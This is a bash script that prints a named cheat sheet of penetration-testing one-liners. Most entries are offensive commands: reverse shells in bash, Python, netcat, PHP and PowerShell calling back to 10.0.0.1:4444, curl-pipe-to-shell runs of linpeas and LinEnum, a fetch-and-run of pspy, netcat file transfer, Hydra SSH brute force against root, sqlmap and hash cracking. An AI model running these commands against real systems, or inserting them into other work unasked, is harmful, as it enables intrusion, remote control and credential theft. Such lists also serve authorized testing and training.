#!/bin/bash

echo "======================================"
echo "  GHOST PENTEST ONELINERS v1.0        "
echo "======================================"
echo ""

COMMAND=""

while [[ $# -gt 0 ]]; do
    case $1 in
        -c|--command) COMMAND="$2"; shift 2 ;;
        -h|--help)
            echo "Usage: $0 [options]"
            echo ""
            echo "Options:"
            echo "  -c, --command <name>   Show specific command"
            echo "  -h, --help             Show this help"
            exit 0 ;;
        *) shift ;;
    esac
done

declare -A ONeliners=(
    ["nmap_fast"]="nmap -sV -T4 -F 10.0.0.1"
    ["nmap_full"]="nmap -p- -sV 10.0.0.1"
    ["nmap_udp"]="sudo nmap -sU -F 10.0.0.1"
    ["nmap_stealth"]="sudo nmap -sS -T2 10.0.0.1"
    ["nmap_vuln"]="nmap --script vuln 10.0.0.1"
    ["shell_bash"]="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
    ["shell_python"]="python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    ["shell_nc"]="nc -e /bin/sh 10.0.0.1 4444"
    ["shell_php"]="php -r '\$s=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ["shell_powershell"]="powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444)\""
    ["reverse_listener"]="nc -lvp 4444"
    ["base64_encode"]="echo 'text' | base64"
    ["base64_decode"]="echo 'dGV4dA==' | base64 -d"
    ["hash_md5"]="echo -n 'text' | md5sum"
    ["hash_sha256"]="echo -n 'text' | sha256sum"
    ["curl_headers"]="curl -I http://target.com"
    ["curl_source"]="curl -s http://target.com"
    ["wget_recursive"]="wget -r -np http://target.com"
    ["nc_file_transfer"]="nc -lvp 4444 < file.txt"
    ["nc_receive"]="nc 10.0.0.1 4444 > received.txt"
    ["pspy64"]="curl -s https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s -o /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy"
    ["linpeas"]="curl -Ls https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linpeas/linpeas.sh | sh"
    ["winpeas"]="curl -Ls https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winpeas/winPEAS.bat -o /tmp/winpeas.bat"
    ["enum_linux"]="curl -s https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash"
    ["searchsploit"]="searchsploit apache 2.4"
    ["msf_console"]="msfconsole -q -x 'search type:exploit platform:linux'"
    ["sqlmap_basic"]="sqlmap -u 'http://target.com/page.php?id=1' --dbs"
    ["nikto_scan"]="nikto -h http://target.com"
    ["dirb_scan"]="dirb http://target.com /usr/share/wordlists/dirb/common.txt"
    ["gobuster_dir"]="gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt"
    ["sublist3r"]="sublist3r -d target.com"
    ["theHarvester"]="theHarvester -d target.com -b all"
    ["metagoofil"]="metagoofil -d target.com -t pdf -o /tmp"
    ["exiftool"]="exiftool image.jpg"
    ["steghide"]="steghide extract -sf image.jpg"
    ["foremost"]="foremost -i image.jpg -o /tmp/extracted"
    ["strings"]="strings malware.bin | head -50"
    ["hexdump"]="hexdump -C malware.bin | head -50"
    ["john_raw"]="john --wordlist=passwords.txt hash.txt"
    ["hashcat"]="hashcat -m 0 hash.txt passwords.txt"
    ["hydra_ssh"]="hydra -l root -P passwords.txt 10.0.0.1 ssh"
    ["cupp"]="python3 cupp.py -i"
)

if [ -n "$COMMAND" ]; then
    if [ -n "${ONeliners[$COMMAND]}" ]; then
        echo "[$COMMAND]"
        echo "${ONeliners[$COMMAND]}"
    else
        echo "[!] Command not found: $COMMAND"
        echo "[*] Available commands:"
        for key in "${!ONeliners[@]}"; do echo "  $key"; done | sort
    fi
else
    echo "Available oneliners:"
    echo ""
    for key in "${!ONeliners[@]}"; do
        printf "%-20s | %s\n" "$key" "${ONeliners[$key]}"
    done | sort
    echo ""
    echo "Usage: $0 -c <command>"
    echo "Example: $0 -c shell_python"
fi
